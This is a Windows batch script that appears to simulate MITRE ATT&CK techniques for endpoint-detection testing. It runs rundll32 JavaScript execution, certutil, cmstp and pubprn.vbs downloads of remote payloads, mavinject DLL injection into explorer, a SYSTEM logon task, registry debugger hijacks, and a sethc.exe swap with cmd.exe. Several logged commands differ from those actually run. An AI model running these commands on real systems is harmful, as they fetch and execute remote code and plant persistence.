REM start line 233
REM end line 326

echo %time% %date% [+] T1085 - Testing rundll32 exec
start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
timeout 5

echo %time% %date% [+] T1130 - Testing certutil download 
start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  
echo Execution Finished at %time% %date%
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1
timeout 5

echo %time% %date% [+] T1191 - Testing cmstp download
start "" cmd /c cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
echo Execution Finished at %time% %date%
echo Command Excuted: cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
timeout 5
echo %time% %date% [+] T1202 - Indirect Command Execution
start "" cmd /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
timeout 5
echo %time% %date% [+] T1028 - Testing Windows Remoting exec
start "" cmd /c winrm qc -q 
start "" cmd /c winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
echo Execution Finished at %time% %date%
echo Command Excuted: winrm qc -q 
echo Command Excuted: winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
timeout 5
echo %time% %date% [+] T1053 - Adding Scheduled Task exec ONLOGON
start "" cmd /c schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System" /f
echo Execution Finished at %time% %date%
echo Command Excuted: schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
timeout 5
echo %time% %date% [+] T1216 - Signed Script Proxy Execution
start "" cmd /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
echo Execution Finished at %time% %date%
echo Command Excuted: cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
timeout 5
echo %time% %date% [+] T1218 / T1055 - Signed Binary Proxy Execution
start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted: for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted:  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Execution Finished at %time% %date%
timeout 5
echo %time% %date% [+] T1033 - System Owner/User Discovery
start "" cmd.exe /c whoami
start "" wmic useraccount get /ALL
start "" cmd.exe /c net group "domain administrators" /domain
start "" cmd.exe /c whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group "domain admins" /domain 2>&1 & net group "Exchange Trusted Subsystem" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1
echo Execution Finished at %time% %date%
echo Command Excuted: cmd.exe /C whoami
echo Command Excuted: wmic useraccount get /ALL
echo Command Excuted: cmd.exe /C net group "domain administrators" /domain

timeout 5
echo %time% %date% [+] T1158 - Hiding data in ADS
echo "test123 > 12.txt
echo "test" > 12.txt:12
echo Execution Finished at %time% %date%
echo Command Excuted: echo "test123 > 12.txt
echo Command Excuted: echo "test123 > 12.txt
timeout 5
echo %time% %date% [+] T1183 - Exec via File Execution Options

start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "C:\windows\system32\calc.exe"
start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 
start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "C:\windows\system32\calc.exe"
echo Execution Finished at %time% %date%
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "calc.exe"
timeout 5
echo %time% %date% [+] T1096 - NTFS File Attributes
type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
echo Execution Finished at %time% %date%
echo Command Excuted: type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
timeout 5

echo %time% %date% [+] T1015 - Sethc replacement
copy /Y C:\windows\system32\sethc.exe C:\windows\system32\sethc.bac
copy /Y C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
copy /Y C:\windows\system32\sethc.bac C:\windows\system32\sethc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: C:\windows\system32\setsh.exe C:\windows\system32\setsh.bac
echo Command Excuted: C:\windows\system32\cmd.exe C:\windows\system32\setsh.exe
echo Command Excuted: C:\windows\system32\setsh.bac C:\windows\system32\setsh.exe

timeout 5